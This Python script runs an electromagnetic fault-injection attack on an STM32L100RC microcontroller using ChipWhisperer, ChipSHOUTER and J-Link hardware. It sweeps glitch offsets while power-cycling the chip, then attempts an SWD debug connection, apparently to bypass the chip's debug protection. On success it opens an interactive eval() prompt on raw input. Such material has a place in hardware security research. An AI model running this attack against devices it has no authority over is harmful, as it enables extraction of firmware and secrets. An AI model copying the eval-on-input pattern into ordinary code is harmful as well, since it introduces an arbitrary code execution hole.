#!/usr/bin/env python3

import sys
import chipwhisperer as cw
import time
import random
import chipshouter
import pylink

scope = None
target = None
# ext_single

cs = None
jlink = None

def initAll():
  print("Configuring ChipWhisperer")
  global scope, target,cs,jlink
  scope = cw.scope()
  target = cw.target(scope)
  scope.adc.samples = 5000
  scope.adc.offset = 0
  scope.adc.basic_mode = "rising_edge"
  scope.clock.clkgen_freq = 8000000 # 120000000 # 737060
  scope.clock.adc_src = "clkgen_x1"
  scope.trigger.triggers = "tio4"
  scope.io.hs2 = "glitch"
  scope.glitch.clk_src = "clkgen"
  scope.glitch.output = "glitch_only"
  scope.io.glitch_lp = False
  scope.io.glitch_hp = True
  scope.glitch.trigger_src = 'ext_single'
  print("Configuring ChipShouter")
  cs = chipshouter.ChipSHOUTER("/dev/ttyUSB0")
  cs.reset_config = True
  cs.voltage = 300
  cs.clr_armed = True
  print("Configuring JLink")
  jlink = pylink.JLink()
  jlink.open()

initAll()
trycounter = 0
CONFIG_TRY = 1000

print("Target init")
target.init()
scope.io.target_pwr = False
trycounter = 0 # change CONFIG_TRY you fucking idiot
time.sleep(5.0)

print(cs)

def thermal_safe():
  global cs
  print("Thermal safety backoff...")
  cs.armed = False
  print(cs)
  time.sleep(15)
  cs.clr_armed = True

def quit_all():
  global scope,target,cs,jlink
  target.dis()
  scope.dis()
  cs.armed = False
  jlink.close()
  input("Halting after keypress")
  sys.exit(0)

print("Go!")
while trycounter < CONFIG_TRY:
  if cs.trigger_safe == False:
    if cs.temperature_mosfet == 65535 and cs.temperature_diode == 65535:
      print("ChipSHOUTER Temperature reading bug, resetting...")
      cs.armed = False
      time.sleep(5.0)
      cs.clr_armed = True
    else:
      print("Unsafe to trigger. Waiting 5 seconds grace period")  
      cs.armed = False
      time.sleep(5.0)
      cs.clr_armed = True
      time.sleep(5.0)
    if cs.trigger_safe == False:
      print("Unsafe to trigger. Exiting")
      cs.armed = False
      print(cs)
      target.dis()
      scope.dis()
      sys.exit(0)
  scope.glitch.width = 4
  scope.glitch.repeat = 1
  scope.glitch.offset = random.randint(-45,45)
  scope.glitch.ext_offset = 1230 + trycounter % 10
  scope.arm()
  time.sleep(0.1)
  scope.io.target_pwr = True
  f = scope.capture()
  time.sleep(0.5)
  jlink.set_tif(pylink.enums.JLinkInterfaces.SWD)
  r = False
  try:
    r = jlink.connect("STM32L100RC",verbose=True)
  except Exception as e:
    print(e,flush=True)
    if str(e) == "Target system has no power.":
      quit_all()
  if r is not False:
    print("Connected!")
    while True:
      x = eval(input("py > ").rstrip())
  scope.io.target_pwr = False
  time.sleep(2.0)
  print("%d Glitched, reps %d" % (trycounter,1))
  if trycounter != 0 and trycounter % 50 == 0:
    thermal_safe()
  trycounter += 1



cs.armed = False
print("Disarmed...")
print(cs)
target.dis()
scope.dis()

print("Bye!")

